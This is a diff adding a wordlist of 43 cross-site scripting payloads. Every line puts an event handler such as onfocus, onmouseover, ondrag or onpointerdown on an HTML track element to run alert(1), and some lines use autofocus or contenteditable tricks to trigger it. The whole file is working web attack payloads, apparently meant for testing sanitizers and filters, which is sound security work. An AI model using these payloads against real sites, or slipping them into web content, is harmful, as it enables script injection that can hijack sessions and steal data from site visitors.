@@ -1,0 +1,43 @@
+<track draggable="true" ondrag="alert(1)">test</track>
+<track draggable="true" ondragend="alert(1)">test</track>
+<track draggable="true" ondragenter="alert(1)">test</track>
+<track draggable="true" ondragleave="alert(1)">test</track>
+<track draggable="true" ondragstart="alert(1)">test</track>
+<track id=x tabindex=1 onactivate=alert(1)></track>
+<track id=x tabindex=1 onbeforeactivate=alert(1)></track>
+<track id=x tabindex=1 onbeforedeactivate=alert(1)></track><input autofocus>
+<track id=x tabindex=1 ondeactivate=alert(1)></track><input id=y autofocus>
+<track id=x tabindex=1 onfocus=alert(1)></track>
+<track id=x tabindex=1 onfocusin=alert(1)></track>
+<track onafterscriptexecute=alert(1)><script>1</script>
+<track onbeforecopy="alert(1)" contenteditable>test</track>
+<track onbeforecut="alert(1)" contenteditable>test</track>
+<track onbeforepaste="alert(1)" contenteditable>test</track>
+<track onbeforescriptexecute=alert(1)><script>1</script>
+<track onblur=alert(1) tabindex=1 id=x></track><input autofocus>
+<track onclick="alert(1)">test</track>
+<track oncontextmenu="alert(1)">test</track>
+<track oncopy=alert(1) value="XSS" autofocus tabindex=1>test
+<track oncut=alert(1) value="XSS" autofocus tabindex=1>test
+<track ondblclick="alert(1)" autofocus tabindex=1>test</track>
+<track onfocusout=alert(1) tabindex=1 id=x></track><input autofocus>
+<track onkeydown="alert(1)" contenteditable>test</track>
+<track onkeypress="alert(1)" contenteditable>test</track>
+<track onkeyup="alert(1)" contenteditable>test</track>
+<track onmousedown="alert(1)">test</track>
+<track onmouseenter="alert(1)">test</track>
+<track onmouseleave="alert(1)">test</track>
+<track onmousemove="alert(1)">test</track>
+<track onmouseout="alert(1)">test</track>
+<track onmouseover="alert(1)">test</track>
+<track onmouseup="alert(1)">test</track>
+<track onmousewheel=alert(1)>requires scrolling
+<track onpaste="alert(1)" contenteditable>test</track>
+<track onpointerdown=alert(1)>XSS</track>
+<track onpointerenter=alert(1)>XSS</track>
+<track onpointerleave=alert(1)>XSS</track>
+<track onpointermove=alert(1)>XSS</track>
+<track onpointerout=alert(1)>XSS</track>
+<track onpointerover=alert(1)>XSS</track>
+<track onpointerrawupdate=alert(1)>XSS</track>
+<track onpointerup=alert(1)>XSS</track>
